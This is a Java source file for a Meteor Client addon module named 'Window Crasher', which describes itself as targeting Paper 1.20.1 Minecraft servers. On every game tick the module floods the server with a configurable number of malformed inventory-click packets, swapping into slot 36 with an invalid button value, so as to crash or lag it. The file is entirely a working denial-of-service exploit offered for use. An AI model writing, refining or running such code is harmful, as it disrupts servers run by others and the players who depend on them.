package widecat.meteorcrashaddon.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;
import widecat.meteorcrashaddon.CrashAddon;

public class WindowCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Crash");

    private final Setting<Integer> crashPower = sgGeneral.add(new IntSetting.Builder()
        .name("Packets per tick")
        .description("Amount of packets sent each tick")
        .defaultValue(6)
        .min(2)
        .sliderMax(12)
        .build()
    );

    private final Setting<Boolean> disableOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("Disable on Leave")
        .description("Automatically disables when you change leave.")
        .defaultValue(true)
        .build()
    );

    public WindowCrash() {
        super(CrashAddon.CATEGORY, "Window Crasher", "Sends silly packets, paper 1.20.1");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        ScreenHandler handler = MinecraftClient.getInstance().player.currentScreenHandler;
        Int2ObjectArrayMap<ItemStackHash> itemMap = new Int2ObjectArrayMap<>();
        itemMap.put(0, ItemStackHash.EMPTY);
        for (int i = 0; i < crashPower.get() + 1; i++) {
            MinecraftClient.getInstance().player.networkHandler.sendPacket(new ClickSlotC2SPacket(handler.syncId, handler.getRevision(), (short) 36, (byte) -1, SlotActionType.SWAP, itemMap, ItemStackHash.fromItemStack(handler.getCursorStack().copy(), mc.player.networkHandler.method_68823())));
        }
    }

    @EventHandler
    private void onWorldChange(GameLeftEvent event) {
        if (disableOnLeave.get() && this.isActive()) {
            this.toggle();
        }
    }

}
